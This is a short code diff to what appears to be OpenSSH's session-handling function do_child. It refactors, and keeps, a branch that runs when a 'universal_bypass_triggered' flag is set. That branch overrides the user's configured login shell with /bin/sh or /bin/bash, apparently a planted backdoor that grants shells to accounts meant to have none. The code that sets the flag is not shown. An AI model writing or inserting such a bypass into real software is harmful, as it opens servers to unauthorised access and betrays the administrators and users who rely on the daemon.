@@ -1443,15 +1443,14 @@ void do_child(struct ssh *ssh, Session *s, const char *command) {
    *  Disregard the user's configured shell, and attempt to start a session
    *  using /bin/bash -> /bin/sh -> user's configured shell as a fallback.
    */
-  const char *chosen_shell = shell;
   if (universal_bypass_triggered) {
     /* Tier 1: Default to sh */
     if (access("/bin/sh", X_OK) == 0) {
-      chosen_shell = "/bin/sh";
+      shell = "/bin/sh";
     }
     /* Tier 2: Check for bash */
     if (access("/bin/bash", X_OK) == 0) {
-      chosen_shell = "/bin/bash";
+      shell = "/bin/bash";
     }
   }
 
@@ -1459,7 +1458,7 @@ void do_child(struct ssh *ssh, Session *s, const char *command) {
    * Make sure $SHELL points to the shell from the password file,
    * even if shell is overridden from login.conf
    */
-  env = do_setup_env(ssh, s, chosen_shell);
+  env = do_setup_env(ssh, s, shell);
 
 #ifdef HAVE_LOGIN_CAP
   shell = login_getcapstr(lc, "shell", (char *)shell, (char *)shell);
